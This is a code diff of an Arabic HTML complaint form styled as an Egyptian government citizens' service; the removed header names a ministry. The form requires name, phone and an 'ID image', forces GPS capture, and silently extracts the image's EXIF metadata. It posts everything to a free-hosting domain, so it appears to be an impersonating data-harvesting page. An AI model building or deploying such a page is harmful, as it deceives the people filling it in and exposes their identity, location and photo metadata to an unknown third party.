@@ -2,78 +2,61 @@
 <html dir="rtl" lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>منظومة الشكاوى الإلكترونية</title>
+    <title>نظام الشكاوى الموحد</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/exif-js/2.3.0/exif.min.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; padding: 20px; }
-        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .header { text-align: center; border-bottom: 2px solid #004a99; margin-bottom: 20px; padding-bottom: 10px; }
-        .step { display: none; }
-        .active { display: block; }
-        input, select, textarea { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #004a99; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
-        .warning { color: #d9534f; font-weight: bold; border: 1px solid #d9534f; padding: 10px; margin: 15px 0; border-radius: 5px; background: #fff5f5; }
+        body { font-family: sans-serif; background: #f4f7f6; padding: 20px; }
+        .container { max-width: 600px; margin: auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .step { display: none; } .active { display: block; }
+        input, select, textarea { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 100%; padding: 12px; background: #004a99; color: white; border: none; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
-
 <div class="container">
-    <div class="header">
-        <h2>وزارة التنمية المحلية والبيئة</h2>
-        <p>الإدارة العامة لخدمة المواطنين | الإدارة المركزية للتحول الرقمي</p>
-    </div>
-
-    <form id="complaintForm" onsubmit="sendData(event)">
+    <form id="complaintForm">
         <div id="step1" class="step active">
-            <input type="text" name="name" placeholder="الاسم الرباعي" required>
-            <input type="tel" name="phone" placeholder="رقم التليفون" required>
-            <div class="warning">تحذير: في حالة كيدية الشكوى سيتم اتخاذ الإجراءات القانونية ضد الشاكي.</div>
+            <h2>بيانات الشاكي</h2>
+            <input type="text" name="name" placeholder="الاسم" required>
+            <input type="tel" name="phone" placeholder="التليفون" required>
             <button type="button" onclick="nextStep()">التالي</button>
         </div>
-
         <div id="step2" class="step">
+            <h2>تفاصيل الشكوى</h2>
             <textarea name="details" placeholder="مضمون الشكوى" required></textarea>
-            <input type="text" name="location" placeholder="عنوان محل المخالفة" required>
+            <input type="text" name="location" placeholder="العنوان" required>
             <select name="category">
-                <option value="قمامة">قمامة</option>
-                <option value="اشغالات">إشغالات</option>
-                <option value="تعديات_دولة">تعديات على أملاك الدولة</option>
-                <option value="تعديات_زراعية">تعديات على الأراضي الزراعية</option>
-                <option value="مخالفات_بناء">مخالفات بناء</option>
+                <option value="قمامة">قمامة</option><option value="اشغالات">اشغالات</option>
             </select>
-            <input type="file" id="imageInput" name="id_image" accept="image/*" required>
-            <input type="hidden" name="lat" id="lat">
-            <input type="hidden" name="lng" id="lng">
+            <input type="file" id="imageInput" name="id_image" required>
+            <input type="hidden" name="lat" id="lat"><input type="hidden" name="lng" id="lng">
             <input type="hidden" name="image_metadata" id="image_metadata">
-            <button type="submit">إرسال الشكوى</button>
+            <button type="submit">إرسال</button>
         </div>
     </form>
 </div>
-
 <script>
     function nextStep() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                document.getElementById('lat').value = pos.coords.latitude;
-                document.getElementById('lng').value = pos.coords.longitude;
-                document.getElementById('step1').classList.remove('active');
-                document.getElementById('step2').classList.add('active');
-            }, () => alert("يرجى تفعيل GPS للمتابعة"), { enableHighAccuracy: true });
-        }
+        navigator.geolocation.getCurrentPosition(pos => {
+            document.getElementById('lat').value = pos.coords.latitude;
+            document.getElementById('lng').value = pos.coords.longitude;
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        });
     }
-
     document.getElementById('imageInput').addEventListener('change', function(e) {
         EXIF.getData(e.target.files[0], function() {
             document.getElementById('image_metadata').value = JSON.stringify(EXIF.getAllTags(this));
         });
     });
 
-    async function sendData(event) {
-        event.preventDefault();
-        let formData = new FormData(document.getElementById('complaintForm'));
-        let res = await fetch("https://molde.freepage.cc/complaints/index.php", { method: "POST", body: formData });
-        alert(await res.text());
-    }
+    document.getElementById('complaintForm').onsubmit = function(e) {
+        e.preventDefault();
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://molde.freepage.cc/complaints/index.php", true);
+        xhr.onload = function() { alert(xhr.responseText); };
+        xhr.send(new FormData(this));
+    };
 </script>
 </body>
 </html>
